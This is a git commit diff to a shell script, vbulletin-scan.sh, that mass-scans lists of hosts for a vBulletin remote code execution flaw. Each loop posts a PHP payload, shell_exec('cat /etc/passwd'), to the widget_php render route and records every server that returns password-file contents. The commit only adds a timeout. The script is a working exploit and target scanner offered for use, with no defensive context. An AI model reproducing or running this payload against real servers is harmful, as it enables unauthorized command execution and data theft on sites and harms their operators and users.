1136669ff525457eb43417b861f51b10325cd792
Frinto <frinto@protonmail.com>
2019-09-25 00:41:27 -0700

    Bug Fix #2

--- vbulletin-scan.sh
+++ vbulletin-scan.sh
@@ -3,7 +3,7 @@ echo "----------------"
 count=1
 cat vbullet-443 | while read -r p; do
 	echo -ne "$count / `cat vbullet-443 | wc -l` - $p                        "\\r
-	curl https://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "https://$p                     "
+	curl https://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 --max-time 15 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "https://$p                     "
 	(( count++ ))
 done 
 
@@ -12,6 +12,6 @@ echo "----------------"
 count=1
 cat vbullet-80 | while read -r p; do
 	echo -ne "$count / `cat vbullet-80 | wc -l` - $p                        "\\r
-        curl http://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "http://$p                       "
+        curl http://$p/index.php?routestring=ajax/render/widget_php --connect-timeout 5 --max-time 15 -s -k --data "widgetConfig[code]=echo shell_exec('cat /etc/passwd');exit;" | grep -w "root:x" > /dev/null && echo "http://$p                       "
 	(( count++ ))
 done 
